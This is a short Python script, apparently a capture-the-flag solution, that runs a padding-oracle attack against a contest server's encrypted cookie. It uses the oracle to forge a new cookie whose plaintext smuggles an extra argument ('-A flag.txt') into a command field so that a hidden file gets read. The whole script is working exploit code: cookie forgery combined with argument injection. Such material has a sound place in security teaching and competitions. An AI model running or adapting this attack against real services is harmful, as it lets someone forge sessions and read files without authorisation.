from padding_oracle import PaddingOracle
import requests


def oracle(cipher_hex):
    headers = {'Cookie': 'vals={}'.format(cipher_hex)}
    r = requests.get('http://hackfest.redrocket.club:32000/convert', headers=headers)
    response = r.content

    if b'Invalid padding bytes.' not in response:
        return True
    else:
        return False


o = PaddingOracle(oracle, max_retries=-1)

cipher = '0497ae2ef997f78c7fe64a8368be98af6d0fe8a1b7732f76fece4bc90fb0afdbec4e73e68ea25d541524a296a23913f81953fb624d6e8cfd77df647d9173377a0bfa0a9439419466ee068ff354aaeb06'
#plain = o.decrypt(cipher)
#print('Plaintext: {}'.format(plain))

exploitCookie = o.craft(cipher, b'{"f": "markdown", "c": " -A flag.txt", "t": "html4"}', b'{"f": "markdown -A flag.txt", "c": "", "t": "html4"}')

print(exploitCookie)
